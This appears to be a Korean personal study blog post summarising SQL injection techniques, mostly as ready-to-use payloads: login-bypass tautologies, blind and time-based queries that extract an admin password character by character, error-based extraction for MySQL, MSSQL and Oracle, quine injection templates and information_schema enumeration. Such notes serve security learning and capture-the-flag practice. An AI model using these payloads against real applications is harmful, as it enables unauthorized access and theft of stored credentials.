---
title : SQL Injection 공격 기법
categories : [Hacking, Web] 
tags : [SQL Injection, Blind SQL Injection, Error Based SQL Injection, Subquery, Time Based SQL Injection, Quine SQL Injection, Information_schema, schemata]
---

## 정리글 모음
<hr style="border-top: 1px solid;"><br>

Link
: <a href="https://blog.ssrf.kr/40" target="_blank">blog.ssrf.kr/40</a>
: <a href="https://dreamhack.io/lecture/courses/27" target="_blank">Server-side Advanced - SQL Injection</a>

<br>

DBMS 종류 별 공격 기법 요약
: <a href="https://learn.dreamhack.io/27#21" target="_blank">Server-side Advanced - SQL Injection</a>

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## SQL Injection
<hr style="border-top: 1px solid;"><br>

```sql
select id from table where id='' or 1 #'

select id from table where id='' or id='admin' #'

select id from table where id='' or 1 --%20' 
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Blind SQL Injection
<hr style="border-top: 1px solid;"><br>

```
select id from table where id='' or id='admin' and ascii(substr(pw,1,1))>1 #'

select id from table where id='' or id='admin' and ord(substr(pw,1,1))>1 #'

select id from table where id='' or id='admin' and ascii(substring(pw,1,1))>1 #'

select id from table where id='' or id='admin' and ascii(mid(pw,1,1))>1 #'
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Subquery
<hr style="border-top: 1px solid;"><br>

Subquery Reference
: <a href="https://dev.mysql.com/doc/refman/8.0/en/subqueries.html" target="_blank">dev.mysql.com/doc/refman/8.0/en/subqueries.html</a>

<br>

+ Subquery
 
  + 한 쿼리 내에 또 다른 쿼리를 사용하는 것으로 사용 시 쿼리 내에서 괄호를 사용하여 괄호 안에 구문을 삽입해야하며 SELECT 문만 사용가능하다.
  
  + SELECT 구문의 컬럼 절에서 서브 쿼리를 사용할 때에는 단일 행 (Single Row)과 단일 컬럼(Single Column)이 반환되야 한다.
    + ```ERROR 1242 (21000): Subquery returns more than 1 row```
    + ```ERROR 1241 (21000): Operand should contain 1 column(s)```
  
  + FROM 절에서는 다중 행 (Multiple Row)과 다중 컬럼 (Multiple Column) 결과를 반환할 수 있다.

  + WHERE 절에서 서브 쿼리를 사용하면 다중 행 결과를 반환하는 쿼리문을 실행할 수 있다.


<br>

```
mysql> SELECT 1,2,3,(SELECT 456); -- 서브 쿼리 사용 예시
+---+---+---+--------------+
| 1 | 2 | 3 | (SELECT 456) |
+---+---+---+--------------+
| 1 | 2 | 3 |          456 |
+---+---+---+--------------+
1 row in set (0.00 sec)
```

<br>

출처
: <a href="https://dreamhack.io/lecture/courses/303" target="_blank">Dreamhack [WHA] Background: SQL Features</a>
: <a href="https://learn.dreamhack.io/27#6" target="_blank">Server-side Advanced - SQL Injection</a>

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Error Based SQL Injection
<hr style="border-top: 1px solid;"><br>

Link
: <a href="https://dreamhack.io/lecture/courses/286" target="_blank">Dreamhack - [WHA] ExploitTech: Error & Time based SQL Injection</a>

<br>

에러를 이용한 공격을 하려면 쿼리가 실행하기 전 발생하는 문법 에러가 아닌, 쿼리 실행 후 발생하는 에러가 필요하다.

가장 많이 사용되는 코드는 ```extracvalue``` 함수로 아래와 같다.

<br>

```php
SELECT extractvalue(1,concat(0x3a,version()));

/* ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log' */
```

<br>

```extractvalue``` 함수는 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출한다.

만약, 두 번째 인자가 올바르지 않은 XPATH 식일 경우 올바르지 않은 XPATH 식이라는 에러 메시지와 함께 잘못된 식을 출력한다.

<br>

```php
mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');

+-----------------------------------------------+
| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+-----------------------------------------------+
| test                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)
```

<br>

```php
mysql> SELECT extractvalue(1, ':abcd');

ERROR 1105 (HY000): XPATH syntax error: ':abcd'
# ":" 로 시작하면 올바르지 않은 XPATH 식
```

<br>

그 외에도 Mysql에서 사용 가능한 여러 방법이 있으며 DBMS에 따라 방법이 다르다.

<br>

```php
SELECT updatexml(null,concat(0x0a,version()),null); 

/* MySQL ERROR 1105 (HY000): XPATH syntax error: '5.7.29-0ubuntu0.16.04.1-log' */
```

<br>

+ Double Query Injection

```php
SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;

select 1 from (select count(*), concat((select version()), 0x3a, floor(rand()*2)) x from information_schema.tables group by x) y

row(1,1)>(select count(*), concat(ps,0x3a,floor(rand()*2)) as a from information_schema.tables group by a)

/* MySQL ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>' */
```

Link
: <a href="https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c" target="_blank">medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c</a>

<br>

row(1,1) 의미
: <a href="https://ch4njun.tistory.com/88" target="_blank">ch4njun.tistory.com/88</a>

<br>

row() Reference
: <a href="https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html" target="_blank">dev.mysql.com/doc/refman/8.0/en/row-subqueries.html</a>

<br>

row() 정리
: The expression is unknown (that is, NULL) if the subquery produces no rows.
: An error occurs if the subquery produces multiple rows because a row subquery can return at most one row.
: The expressions (1,2) and ROW(1,2) are sometimes called row constructors. The two are equivalent.
: The row constructor and the row returned by the subquery must contain the same number of values.
: A row constructor is used for comparisons with subqueries that return two or more columns.
: When a subquery returns a single column, this is regarded as a scalar value and not as a row, so a row constructor cannot be used with a subquery that does not return at least two columns.

<br>

```php
SELECT * FROM t1 WHERE (column1,column2) = (1,1);

/* 같은 의미 */

SELECT * FROM t1 WHERE column1 = 1 AND column2 = 1;
```

<br>

```php
For row comparisons, (a, b) > (x, y) is equivalent to:

(a > x) OR ((a = x) AND (b > y))
```

<br><br>

+ MSSQL

```php
SELECT convert(int,@@version);

SELECT cast((SELECT @@version) as int);

/* 
Conversion failed when converting the nvarchar value '
  Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
	Feb 20 2014 19:20:46 
	Copyright (c) Microsoft Corporation
	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
' to data type int.
*/
```

<br><br>

+ ORACLE

```php
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;

/*
ORA-20000: Oracle Text error:
DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
ORA-06512: at "CTXSYS.DRUE", line 183
ORA-06512: at "CTXSYS.DRITHSX", line 555
ORA-06512: at line 1
*/
```

<br>

읽어보기
: <a href="https://blog.ch4n3.kr/496" target="_blank">blog.ch4n3.kr/496</a>

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Error Based Blind SQL Injection
<hr style="border-top: 1px solid;"><br>

```
-> double형 최대 값 넘은 값 (0xffffffff*0xffffffffffff)
-> subquery 리턴 개수 1임을 이용한 에러 이용

select if(1=1, 9e307*2,0);  /* ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)' */

select id from table where id='' or id='admin' and if(ascii(substr(pw,1,1))>1,1,0xfffffff*0xffffffffff)#'

select id from table where id='' or id='admin' and if(ascii(substr(pw,1,1))>1,1,(select 1 union select 2)) #'

select id from table where id='' or id='admin' and if(ascii(substr(pw,1,1))>1,1,(select 1 from table)) #'
  --> select 1 from table 하면 3개의 값이 리턴됨.
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Time Based SQL Injection
<hr style="border-top: 1px solid;"><br>

Time based SQL Injection은 시간 지연을 이용해 쿼리의 참/거짓 여부를 판단하는 공격 기법. 

방법으로는 DBMS에서 제공하는 함수를 이용하는 것과 시간이 많이 소요되는 연산을 수행하는 헤비 쿼리 (heavy query)를 사용하는 방법이 있다.

+ ```SELECT SLEEP(10);```

+ ```SELECT BENCHMARK(40000000,SHA1(1));```

+ ```SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Time Based Blind SQL Injection
<hr style="border-top: 1px solid;"><br>

```
select id from table where id='' or id='admin' and ascii(substr(pw,1,1))=48 and sleep(5) #'
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Quine SQL Injection
<hr style="border-top: 1px solid;"><br>

싱글쿼트가 필요한 경우
: ```select replace(replace('[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]',char(34),char(39)),char(36),'[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]') [postfix];```

<br>

더블쿼트가 필요한 경우
: ```select replace(replace("[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]",char(39),char(34)),char(36),"[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]") [postfix];```

<br>

자세히 확인
: <a href="https://blog.p6.is/quine-sql-injection/" target="_blank">blog.p6.is/quine-sql-injection/</a>  

<br>

정리하면 다음과 같음.

```php
$a = [추가해도 됨] select replace(replace("$", char(34), char(39)), char(36), "$") as quine [추가해도 됨]

# -> 단, 더블쿼터가 싱글쿼터로 바뀐다는 점 유의해서 추가

[추가해도 됨] select replace(replace('$a', char(34), char(39)), char(36), '$a') as quine [추가해도 됨]
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## Information_Schema
<hr style="border-top: 1px solid;"><br>

mysql에 접속한 유저 목록 출력
: ```select user() 또는 select system_user()```

<br>

해당 mysql 서버에 존재하는 db 목록 출력
: ```select schema_name from information_schema.schemata```

<br>

test db에 존재하는 테이블, 컬럼 목록 출력
: ```select table_name, column_name from information_schema.columns where table_schema = 'test'```

<br>

현재 DB에 존재하는 테이블, 컬럼 목록 출력
: ```select table_name, column_name from information_schema.columns where table_schema =  database()```

<br>

현재 입력한 쿼리문 출력
: ```select * from information_schema.processlist```
: ```select user,current_statement from sys.session```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## PROCEDURE ANALYSE()
<hr style="border-top: 1px solid;"><br>

Link 
: <a href="https://ind2x.github.io/posts/mysql_procedure_analyse()/" target="_blank">ind2x.github.io/posts/mysql_procedure_analyse()/</a>

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>
